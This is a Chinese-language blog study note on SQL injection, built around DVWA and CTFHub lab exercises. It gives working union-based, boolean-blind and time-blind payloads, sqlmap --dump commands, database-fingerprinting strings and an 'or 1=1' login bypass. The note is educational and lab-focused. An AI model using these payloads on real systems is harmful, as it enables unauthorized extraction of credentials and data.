

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" href="/img/fav.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Sl0th">
  <meta name="keywords" content="">
  
    <meta name="description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息 审计源代码 发现主要执行的SQL语句为:  1SEL">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入学习">
<meta property="og:url" content="http://sloth31.github.io/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Sl0th&#39;s Blog">
<meta property="og:description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息 审计源代码 发现主要执行的SQL语句为:  1SEL">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221721.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221259.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221711.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221287.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221732.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221925.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222504.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222451.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231275.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231655.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232760.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232156.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232923.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232669.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232308.jpg">
<meta property="article:published_time" content="2022-01-23T14:20:06.000Z">
<meta property="article:modified_time" content="2024-07-03T14:33:08.833Z">
<meta property="article:author" content="Sl0th">
<meta property="article:tag" content="mysql">
<meta property="article:tag" content="web">
<meta property="article:tag" content="php">
<meta property="article:tag" content="sql">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png">
  
  
  
  <title>sql注入学习 | Sl0th&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Sl0th&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="sql注入学习"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-01-23 22:20" pubdate>
          2022年1月23日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          30k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          165 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">sql注入学习</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>SQL注入是指在判断出注入点后，将<strong>恶意的SQL语句</strong>添加到输入参数中，使得后台服务器<u>执行添加的SQL语句</u>，从而达到窃取网站敏感信息等目的</p>
<h2 id="二、实例及原理"><a href="#二、实例及原理" class="headerlink" title="二、实例及原理"></a>二、实例及原理</h2><h3 id="2-1字符型注入-dvwa平台sql注入简单级别"><a href="#2-1字符型注入-dvwa平台sql注入简单级别" class="headerlink" title="2.1字符型注入(dvwa平台sql注入简单级别)"></a>2.1字符型注入(dvwa平台sql注入简单级别)</h3><h4 id="查看回显"><a href="#查看回显" class="headerlink" title="查看回显"></a>查看回显</h4><p>输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png" srcset="/img/loading.gif" lazyload alt="1"></p>
<h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><ul>
<li>发现主要执行的SQL语句为:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>类似这类传入参数以<code>&#39;</code>包裹的称为字符型注入，可以通过传入 <code>1&#39; xxx#</code>(xxx为恶意的SQL语句)的方式来执行恶意的SQL语句<br><strong>原因</strong>:</p>
<ul>
<li>数字后跟的<code>&#39;</code>与源码中$id前的<code>&#39;</code>优先匹配，后面的SQL语句只要用union与前面的SELECT语句连接，就可以做到让后台服务器执行能达到攻击目的的SQL语句。</li>
<li>最后的<code>#</code>作用是将语句结尾的<code>&#39;</code>和<code>;</code>注释掉，将<code>&#39;</code>注释掉是为了防止语法错误，并且对于单句SQL语句即使没有<code>;</code>也可以正常执行</li>
</ul>
</blockquote>
<ul>
<li>回显部分的代码为:</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>    <span class="hljs-comment">// Get values</span><br>    <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>    <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br/&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br/&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>由于使用while循环，可以猜想到如果执行的SQL语句union上别的SQL语句(联合查询)，只要查询的字段数和类型相同，每一行的数据都可以被回显出来</p>
</blockquote>
<h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>SQL语言中<code>order by</code>关键字用于给查询的表添加排序条件并且处于SELECT语句末尾，正常情况下我们并不知道查询结果的字段名，但可以在<code>order by</code>后直接跟数字1表示按第一字段排序，用此方式发现在输入 <code>1&#39; and order by 3#</code>时发生错误，因此得知查询结果总列数为2,这表示之后union 后的select语句仅仅只能查询<strong>两个字段</strong><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221721.png" srcset="/img/loading.gif" lazyload alt="1"></p>
<h4 id="获取库名、表名、字段名"><a href="#获取库名、表名、字段名" class="headerlink" title="获取库名、表名、字段名"></a>获取库名、表名、字段名</h4><ul>
<li>获取库名,要想获取关键信息，得知道库名、表名、字段名，利用user()和database()函数分别获取用户名和数据库名称<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221259.png" srcset="/img/loading.gif" lazyload alt="1"></li>
</ul>
<blockquote>
<p>由于该情景下union后的select语句必须有两个字段，这里主要获取数据库名称，user()可以替换成其他函数或者常量等等都可以</p>
<h3 id="获取所有库名"><a href="#获取所有库名" class="headerlink" title="获取所有库名"></a>获取所有库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> group_concat(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata<br></code></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>获取表名,这边需要了解到<code>information_schema</code>是mysql自带的数据库，其中名为<code>tables</code>的表中的两个字段<code>table_name</code>和<code>table_schema</code>记录了DBMS中的存储的表名和表名所在的数据库。现在我们已经知道了数据库名称为<code>dvwa</code>，可以加入WHERE进行条件查询,最终后台服务器运行的SQL语句为:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">union</span><br><span class="hljs-keyword">select</span> table_name, table_schema <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>得到表名有两个，分别为<code>guestbook</code>和 <code>users</code>，根据经验判断网站敏感信息存储在users表中</p>
</blockquote>
<ul>
<li><p>获取字段名，<code>information_schema</code>中有一张名为<code>columns</code>的表，其中<code>column_name</code>存储了字段名，通过增加条件<code>table_name = &#39;users&#39;</code>，成功获取<code>users</code>表的字段名<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221711.png" srcset="/img/loading.gif" lazyload alt="1"></p>
</li>
<li><p><strong>获取敏感信息</strong>: 从字段名可看出，user和password存储着重要信息，添加<code>select user, password from dvwa.users</code> 即可得到账号及密码，密码使用了md5加密<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221287.png" srcset="/img/loading.gif" lazyload alt="1"></p>
</li>
</ul>
<h3 id="2-2-整数型注入-CTFHub技能树"><a href="#2-2-整数型注入-CTFHub技能树" class="headerlink" title="2.2 整数型注入(CTFHub技能树)"></a>2.2 整数型注入(CTFHub技能树)</h3><ul>
<li>输入1，由下方红字提示输入的内容没有被<code>&#39;</code>包裹，这种称为整数型输入，输入<code>1 and 1=2</code>没有回显也可以验证这是整数型注入，因为如果是字符型，字符串’1 and 1&#x3D;2’自动转换成整数1，仍有回显<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221732.png" srcset="/img/loading.gif" lazyload alt="1"></li>
</ul>
<blockquote>
<p>SQL中字符串自动转换成整型规律：从左边第一个字符开始排查起，转换成出现的第一个非数字字符前的数字对应的整型，如果第一个字符就不是数字，则转换成0</p>
</blockquote>
<ul>
<li>继续使用同字符型注入同样的方法，<strong>判断完列数后</strong>在输入的ID后跟上union语句,发现回显仍为id为1的信息，原因猜测是该网页只会回显查询结果的第一行，因此要实现让前一个select语句查询结果为空，可以让其WHERE后跟的条件始终为加，如：<code>1 and 1=2</code><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221925.png" srcset="/img/loading.gif" lazyload alt="1"></li>
<li>剩下的同字符型注入一样的流程：得到数据库名、表名、字段名，需要注意的是，查询结果只返回一行，为了防止查询结果有多行无法显示完全，使用<code>group_concat(字段名)</code>函数，将所有行综合为一行输出，最终得到flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222504.png" srcset="/img/loading.gif" lazyload alt="1"></li>
</ul>
<h3 id="2-3-SQL盲注"><a href="#2-3-SQL盲注" class="headerlink" title="2.3 SQL盲注"></a>2.3 SQL盲注</h3><p>盲注指SQL语句执行查询后，查询数据不能回显到前端页面中</p>
<h4 id="可能需要用到的函数、关键字"><a href="#可能需要用到的函数、关键字" class="headerlink" title="可能需要用到的函数、关键字"></a>可能需要用到的函数、关键字</h4><ul>
<li>substr(字符串,索引开始位,索引结束位):用于获取字符串中的特定字符</li>
<li><code>limit 开始行数的索引,显示的总行数</code>:放在select查询语句最后,限制显示行数,索引从0开始</li>
<li>ascii(字符):将某个字符转换为ascii值</li>
<li>ord(str)：函数返回字符串str的最左边字符的ASCII码值</li>
</ul>
<h4 id="布尔盲注-字符型为例"><a href="#布尔盲注-字符型为例" class="headerlink" title="布尔盲注(字符型为例)"></a>布尔盲注(字符型为例)</h4><p>适用于回显只有两种的情况，如<code>User ID exists in the database.</code>和<code>User ID is MISSING from the database.</code>分别对应了输入语句返回的布尔值。</p>
<ul>
<li>如果采用手动注入，一般要结合二分查找、穷举法等方法来逐一破解出库、表、字段的名称。(以下为猜解数据库名称的例子)</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">count</span><span class="hljs-params">(schema_name)</span> from information_schema.schemata)&gt; n # <span class="hljs-comment">//猜解数据库个数</span><br>1&#x27; and <span class="hljs-title function_">length</span><span class="hljs-params">(database())</span>=n # <span class="hljs-comment">//n为大于1的整数,猜解数据库名称长度</span><br><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">ascii</span><span class="hljs-params">(substr((select schema_name from information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))</span>)&gt;n # <span class="hljs-comment">//n为大小写字母对应的ASCII码值，此处需借用二分查找来逐一确定每一个数据库的名称</span><br></code></pre></td></tr></table></figure>

<ul>
<li>可以借用sqlmap工具来自动化实现这种机器的过程，mac下具体指令为</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch --dbs  <span class="hljs-comment">//获取数据库名称,batch意思为不询问输入默认输入Y</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 --tables <span class="hljs-comment">//获取表名</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 --columns <span class="hljs-comment">//获取字段名</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 -C 字段名 --dump <span class="hljs-comment">//获取字段内存储信息</span><br></code></pre></td></tr></table></figure>

<p>最终得到flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222451.png" srcset="/img/loading.gif" lazyload alt="1"></p>
<h4 id="时间盲注-字符型为例"><a href="#时间盲注-字符型为例" class="headerlink" title="时间盲注(字符型为例)"></a>时间盲注(字符型为例)</h4><p>仅要求有回显，主要原理是利用SQL中if函数及sleep函数再加上其他用于拆解字符串、转换字符为ASCII码值的函数，sleep函数作为if函数的第二个参数，猜解名称的函数作为if的第一个参数，第三个参数可以任意赋值，但不能与sleep函数相同，因此若猜解函数返回正确，则执行sleep函数，效果为网页延迟了设定的描述才显示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> and <span class="hljs-title function_">if</span> <span class="hljs-params">((ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">100</span>),sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)</span> # <span class="hljs-comment">//判断数据库名称第一个字符是否为&#x27;d&#x27;，结果显示明显延迟</span><br></code></pre></td></tr></table></figure>

<h2 id="三、判断注入点"><a href="#三、判断注入点" class="headerlink" title="三、判断注入点"></a>三、判断注入点</h2><h3 id="3-1判断是否存在SQL注入漏洞"><a href="#3-1判断是否存在SQL注入漏洞" class="headerlink" title="3.1判断是否存在SQL注入漏洞"></a>3.1判断是否存在SQL注入漏洞</h3><p>输入<code>1&#39;</code>如果报错，则存在注入漏洞，报错原因是单引号数量不匹配，如果没报错，说明可能该网页过滤了单引号</p>
<h3 id="3-2判断是字符型还是整数型"><a href="#3-2判断是字符型还是整数型" class="headerlink" title="3.2判断是字符型还是整数型"></a>3.2判断是字符型还是整数型</h3><ul>
<li>输入<code>1 and 1=2</code>和<code>1&#39;#</code>和<code>1&#39; and &#39;1&#39;=&#39;1</code>若都回显id为1的信息,则为字符型</li>
<li>输入<code>1 and 1=2</code>没有回显，且输入<code>1 and 1=1</code>有回显，则为数字型,原因<code>1 and 1=2</code>恒为假，过滤掉所有的行</li>
</ul>
<h3 id="3-3判断能否时间盲注"><a href="#3-3判断能否时间盲注" class="headerlink" title="3.3判断能否时间盲注"></a>3.3判断能否时间盲注</h3><table>
<thead>
<tr>
<th align="left">MySQL</th>
<th align="left">benchmark(100000000,md(5))sleep(3)</th>
</tr>
</thead>
<tbody><tr>
<td align="left">PostgreSQL</td>
<td align="left">PG_sleep(5)Generate_series(1,1000000)</td>
</tr>
<tr>
<td align="left">SQLServer</td>
<td align="left">waitfor delay ‘0:0:5’</td>
</tr>
</tbody></table>
<h3 id="3-4判断数据库类型"><a href="#3-4判断数据库类型" class="headerlink" title="3.4判断数据库类型"></a>3.4判断数据库类型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Mysql数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> information_schema.tables) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 access数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> msysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Sqlserver数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> sysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是Oracle数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> #<br></code></pre></td></tr></table></figure>

<h2 id="四、常用函数、基础知识"><a href="#四、常用函数、基础知识" class="headerlink" title="四、常用函数、基础知识"></a>四、常用函数、基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><ul>
<li>system_user()——系统用户名 </li>
<li>user()——用户名 </li>
<li>current_user()——当前用户名 </li>
<li>session_user()——链接数据库的用户名 </li>
<li>database()——数据库名 </li>
<li>version()——数据库版本 </li>
<li>@@datadir——数据库路径 </li>
<li>@@basedir——数据库安装路径 </li>
<li>@@version_conpile_os——操作系统</li>
</ul>
<h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><ul>
<li>concat(str1,str2,…)——没有分隔符地连接字符串 </li>
<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 </li>
<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</li>
</ul>
<h3 id="两种注释"><a href="#两种注释" class="headerlink" title="两种注释"></a>两种注释</h3><ul>
<li>–+</li>
<li><code>#</code>(url编码%23)</li>
</ul>
<h3 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h3><p>万能密码构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>’admin’ andpassword<span class="hljs-operator">=</span>’’<span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>在sql中and运算符优先级大于or运算符，类比&amp;&amp;&gt;||</p>
</blockquote>
<p>sql中也能使用位运算</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>&amp;的优先级大于&#x3D;</p>
</blockquote>
<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 字段 [<span class="hljs-keyword">asc</span><span class="hljs-operator">|</span><span class="hljs-keyword">desc</span>]; # <span class="hljs-keyword">asc</span>升序，默认的<br></code></pre></td></tr></table></figure>

<blockquote>
<p>用于判断列数，不知道列名时用1 2 3……表示第1 2 3……列</p>
</blockquote>
<h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p>mysql版本&gt;&#x3D;5.0</p>
<p>该库中有三个表schemata(各数据库名schema_name)、tables(各表名table_name)、columns(各列名)</p>
